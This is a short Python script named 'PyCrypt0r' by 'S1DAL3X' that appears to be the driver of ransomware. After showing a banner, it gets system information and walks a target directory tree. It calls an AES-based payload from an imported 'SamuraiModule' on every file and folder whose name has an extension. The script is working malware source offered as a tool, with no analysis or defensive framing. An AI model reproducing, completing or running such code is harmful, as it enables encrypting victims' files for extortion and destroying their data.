#!/usr/bin/python

import os, random, struct, hashlib
import SamuraiModule as Samurai
from Crypto.Cipher import AES

def show_banner():
	banner = '''
	__________        _________                        __   _______         
	\______   \___.__.\_   ___ \_______ ___.__._______/  |_ \   _  \_______ 
	 |     ___<   |  |/    \  \/\_  __ <   |  |\____ \   __\/  /_\  \_  __ \
	 |    |    \___  |\     \____|  | \/\___  ||  |_> >  |  \  \_/   \  | \/
	 |____|    / ____| \______  /|__|   / ____||   __/|__|   \_____  /__|   
		   \/             \/        \/     |__|                \/  
					BY S1DAL3X      
	'''
	print(banner)

def main(path):
	os.chdir(str(path))
	for root, dirs, files in os.walk('.', topdown = False):
		for name in files:
			if len(name.split(".")) > 1:
				Samurai.payload(Samurai.KEY, os.path.join(root, name))
			else:
				pass
	  	for name in dirs:
			if len(name.split(".")) > 1:
				Samurai.payload(Samurai.KEY, os.path.join(root, name))
			else:
				pass

if __name__ == "__main__":
	Samurai.get_system()
	main(Samurai.SYS_INFO["PATH"])
